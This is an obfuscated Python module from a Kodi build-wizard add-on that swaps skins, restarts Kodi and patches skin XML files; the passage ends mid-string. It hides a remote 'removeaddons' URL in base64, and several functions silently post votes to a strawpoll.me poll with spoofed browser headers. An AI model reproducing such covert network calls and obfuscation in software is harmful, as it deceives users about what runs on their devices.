# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:39
ADDONTITLE =uservar .ADDONTITLE #line:40
ADDON =wiz .addonId (ADDON_ID )#line:41
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:42
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:43
DIALOG =xbmcgui .Dialog ()#line:44
DP =xbmcgui .DialogProgress ()#line:45
HOME =xbmc .translatePath ('special://home/')#line:46
LOG =xbmc .translatePath ('special://logpath/')#line:47
PROFILE =xbmc .translatePath ('special://profile/')#line:48
ADDONS =os .path .join (HOME ,'addons')#line:49
USERDATA =os .path .join (HOME ,'userdata')#line:50
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:51
PACKAGES =os .path .join (ADDONS ,'packages')#line:52
ADDOND =os .path .join (USERDATA ,'addon_data')#line:53
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:54
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:55
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:56
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:57
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:58
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:59
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:60
DATABASE =os .path .join (USERDATA ,'Database')#line:61
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:62
ICON =os .path .join (ADDONPATH ,'icon.png')#line:63
ART =os .path .join (ADDONPATH ,'resources','art')#line:64
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:65
DP2 =xbmcgui .DialogProgressBG ()#line:66
SKIN =xbmc .getSkinDir ()#line:67
BUILDNAME =wiz .getS ('buildname')#line:68
DEFAULTSKIN =wiz .getS ('defaultskin')#line:69
DEFAULTNAME =wiz .getS ('defaultskinname')#line:70
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:71
BUILDVERSION =wiz .getS ('buildversion')#line:72
BUILDTHEME =wiz .getS ('buildtheme')#line:73
BUILDLATEST =wiz .getS ('latestversion')#line:74
INSTALLMETHOD =wiz .getS ('installmethod')#line:75
SHOW15 =wiz .getS ('show15')#line:76
SHOW16 =wiz .getS ('show16')#line:77
SHOW17 =wiz .getS ('show17')#line:78
SHOW18 =wiz .getS ('show18')#line:79
SHOWADULT =wiz .getS ('adult')#line:80
SHOWMAINT =wiz .getS ('showmaint')#line:81
AUTOCLEANUP =wiz .getS ('autoclean')#line:82
AUTOCACHE =wiz .getS ('clearcache')#line:83
AUTOPACKAGES =wiz .getS ('clearpackages')#line:84
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:85
AUTOFEQ =wiz .getS ('autocleanfeq')#line:86
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:87
INCLUDENAN =wiz .getS ('includenan')#line:88
INCLUDEURL =wiz .getS ('includeurl')#line:89
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:90
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:91
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:92
INCLUDEVIDEO =wiz .getS ('includevideo')#line:93
INCLUDEALL =wiz .getS ('includeall')#line:94
INCLUDEBOB =wiz .getS ('includebob')#line:95
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:96
INCLUDESPECTO =wiz .getS ('includespecto')#line:97
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:98
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:99
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:100
INCLUDESALTS =wiz .getS ('includesalts')#line:101
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:102
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:103
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:104
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:105
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:106
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:107
INCLUDEURANUS =wiz .getS ('includeuranus')#line:108
SEPERATE =wiz .getS ('seperate')#line:109
NOTIFY =wiz .getS ('notify')#line:110
NOTEDISMISS =wiz .getS ('notedismiss')#line:111
NOTEID =wiz .getS ('noteid')#line:112
NOTIFY2 =wiz .getS ('notify2')#line:113
NOTEID2 =wiz .getS ('noteid2')#line:114
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:115
NOTIFY3 =wiz .getS ('notify3')#line:116
NOTEID3 =wiz .getS ('noteid3')#line:117
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:118
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:119
TRAKTSAVE =wiz .getS ('traktlastsave')#line:120
REALSAVE =wiz .getS ('debridlastsave')#line:121
LOGINSAVE =wiz .getS ('loginlastsave')#line:122
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:123
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:124
KEEPINFO =wiz .getS ('keepinfo')#line:125
KEEPSOUND =wiz .getS ('keepsound')#line:127
KEEPVIEW =wiz .getS ('keepview')#line:128
KEEPSKIN =wiz .getS ('keepskin')#line:129
KEEPADDONS =wiz .getS ('keepaddons')#line:130
KEEPSKIN2 =wiz .getS ('keepskin2')#line:131
KEEPSKIN3 =wiz .getS ('keepskin3')#line:132
KEEPTORNET =wiz .getS ('keeptornet')#line:133
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:134
KEEPPVR =wiz .getS ('keeppvr')#line:135
ENABLE =uservar .ENABLE #line:136
KEEPVICTORY =wiz .getS ('keepvictory')#line:137
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 =''#line:252
IPTVSIMPL18PC =''#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	OO00OOOOOO00OO00O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	O000O0O000OO0OOOO =[];O0O0OOOO00OOOOO00 =[]#line:266
	for O000OO00000O00O00 in sorted (OO00OOOOOO00OO00O ,key =lambda OOOOO0000000OOO00 :OOOOO0000000OOO00 ):#line:267
		O0OOOO0O0OO00O00O =os .path .split (O000OO00000O00O00 [:-1 ])[1 ]#line:268
		OOO0OOOOO00OO0OOO =os .path .join (O000OO00000O00O00 ,'addon.xml')#line:269
		if os .path .exists (OOO0OOOOO00OO0OOO ):#line:270
			OO00O000000OO00OO =open (OOO0OOOOO00OO0OOO )#line:271
			OOOO00O0O0O0OOOOO =OO00O000000OO00OO .read ()#line:272
			OO00O00OOOOO0OOOO =parseDOM2 (OOOO00O0O0O0OOOOO ,'addon',ret ='id')#line:273
			OO0O0O00O0O0O0000 =O0OOOO0O0OO00O00O if len (OO00O00OOOOO0OOOO )==0 else OO00O00OOOOO0OOOO [0 ]#line:274
			try :#line:275
				O0OOO0O0OO0OOO0OO =xbmcaddon .Addon (id =OO0O0O00O0O0O0000 )#line:276
				O000O0O000OO0OOOO .append (O0OOO0O0OO0OOO0OO .getAddonInfo ('name'))#line:277
				O0O0OOOO00OOOOO00 .append (OO0O0O00O0O0O0000 )#line:278
			except :#line:279
				pass #line:280
	O0OO00O000000O000 =[];OO00OO00O0O0O0O00 =0 #line:281
	O000000O0000O00O0 =["Current Skin -- %s"%currSkin ()]+O000O0O000OO0OOOO #line:282
	OO00OO00O0O0O0O00 =DIALOG .select ("Select the Skin you want to swap with.",O000000O0000O00O0 )#line:283
	if OO00OO00O0O0O0O00 ==-1 :return #line:284
	else :#line:285
		O00000OO0O0OO0O00 =(OO00OO00O0O0O0O00 -1 )#line:286
		O0OO00O000000O000 .append (O00000OO0O0OO0O00 )#line:287
		O000000O0000O00O0 [OO00OO00O0O0O0O00 ]="%s"%(O000O0O000OO0OOOO [O00000OO0O0OO0O00 ])#line:288
	if O0OO00O000000O000 ==None :return #line:289
	for O0000O000OOOO0000 in O0OO00O000000O000 :#line:290
		swapSkins (O0O0OOOO00OOOOO00 [O0000O000OOOO0000 ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (OO0O0OOOOO000O0O0 ,title ="Error"):#line:295
	O0OO0O0OO000OO00O ='lookandfeel.skin'#line:296
	OOO00O0000O00OO00 =OO0O0OOOOO000O0O0 #line:297
	OOOOOOOO0000OOO0O =getOld (O0OO0O0OO000OO00O )#line:298
	OO0OOOOO0O0O0O000 =O0OO0O0OO000OO00O #line:299
	setNew (OO0OOOOO0O0O0O000 ,OOO00O0000O00OO00 )#line:300
	OO0O0OO0OOO0000O0 =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OO0OOO0000O0 <100 :#line:302
		OO0O0OO0OOO0000O0 +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (O000O000O0OO0O000 ):#line:309
	try :#line:310
		O000O000O0OO0O000 ='"%s"'%O000O000O0OO0O000 #line:311
		O00O0O0OOOO00O00O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O000O000O0OO0O000 )#line:312
		OOO00OOOOO00OO0O0 =xbmc .executeJSONRPC (O00O0O0OOOO00O00O )#line:314
		OOO00OOOOO00OO0O0 =simplejson .loads (OOO00OOOOO00OO0O0 )#line:315
		if OOO00OOOOO00OO0O0 .has_key ('result'):#line:316
			if OOO00OOOOO00OO0O0 ['result'].has_key ('value'):#line:317
				return OOO00OOOOO00OO0O0 ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (O000OOO00OOOOOOO0 ,OO00O00O0OO0O000O ):#line:324
	try :#line:325
		O000OOO00OOOOOOO0 ='"%s"'%O000OOO00OOOOOOO0 #line:326
		OO00O00O0OO0O000O ='"%s"'%OO00O00O0OO0O000O #line:327
		O00000OOOO0O0000O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O000OOO00OOOOOOO0 ,OO00O00O0OO0O000O )#line:328
		OOOOOOOO00000O0O0 =xbmc .executeJSONRPC (O00000OOOO0O0000O )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			OO0O000O0O00OO000 =xbmcgui .DialogProgress ()#line:339
			OO0O000O0O00OO000 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			OO0O000O0O00OO000 .update (0 )#line:343
			for OO0000OO00OO0O0OO in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				OO0O000O0O00OO000 .update (int ((5 -OO0000OO00OO0O0OO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0000OO00OO0O0OO ),'')#line:346
				if OO0O000O0O00OO000 .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			OO0O000O0O00OO000 =xbmcgui .DialogProgress ()#line:352
			OO0O000O0O00OO000 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			OO0O000O0O00OO000 .update (0 )#line:356
			for OO0000OO00OO0O0OO in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				OO0O000O0O00OO000 .update (int ((5 -OO0000OO00OO0O0OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0000OO00OO0O0OO ),'')#line:359
				if OO0O000O0O00OO000 .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    O0OOO0OO0O0000000 ='18773068'#line:372
    O000OOO00OOOOOO00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOO0OO0O0000000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    OOOOOO0OOO0000O0O ='145273320'#line:386
    O000OO0OOOOO0OOO0 ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        O0O0O0O0OO00OO0OO =OOOOOO0OOO0000O0O #line:389
    else :#line:390
        O0O0O0O0OO00OO0OO =O000OO0OOOOO0OOO0 #line:391
    O0O0O000OO0OOO000 ={'options':O0O0O0O0OO00OO0OO }#line:395
    OOO000OOO0OOO0OO0 =requests .post ('https://www.strawpoll.me/'+O0OOO0OO0O0000000 ,headers =O000OOO00OOOOOO00 ,data =O0O0O000OO0OOO000 )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        OO0O00OOOOO0000OO ='18773068'#line:401
        OO0O0000O0O0O0O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0O00OOOOO0000OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        O0O0OOOOO0OO0O000 ='145273320'#line:415
        O000000OO00000OOO ={'options':O0O0OOOOO0OO0O000 }#line:421
        O00O00OOOOOOOOO00 =requests .post ('https://www.strawpoll.me/'+OO0O00OOOOO0000OO ,headers =OO0O0000O0O0O0O0O ,data =O000000OO00000OOO )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        O00OO000OO0O00O0O ='18773068'#line:428
        OOO00O000O00O0O00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OO000OO0O00O0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        OOO000O0O0000000O ='145273321'#line:442
        OOOOO0000OOO00OOO ={'options':OOO000O0O0000000O }#line:448
        OOOO0O0OO0OOO0OO0 =requests .post ('https://www.strawpoll.me/'+O00OO000OO0O00O0O ,headers =OOO00O000O00O0O00 ,data =OOOOO0000OOO00OOO )#line:450
   except :pass #line:451
def kodi17to18 ():#line:454
  if KODIV >=18 :#line:456
    OOO0OOO0O0O00O0O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:458
    with open (OOO0OOO0O0O00O0O0 ,'r')as OO0000O0OOOOO0OO0 :#line:459
      O0000OO000O00OO0O =OO0000O0OOOOO0OO0 .read ()#line:460
    O0000OO000O00OO0O =O0000OO000O00OO0O .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')#line:507
    with open (OOO0OOO0O0O00O0O0 ,'w')as OO0000O0OOOOO0OO0 :#line:510
      OO0000O0OOOOO0OO0 .write (O0000OO000O00OO0O )#line:511
    OOO0OOO0O0O00O0O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:517
    with open (OOO0OOO0O0O00O0O0 ,'r')as OO0000O0OOOOO0OO0 :#line:518
      O0000OO000O00OO0O =OO0000O0OOOOO0OO0 .read ()#line:519
    O0000OO000O00OO0O =O0000OO000O00OO0O .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
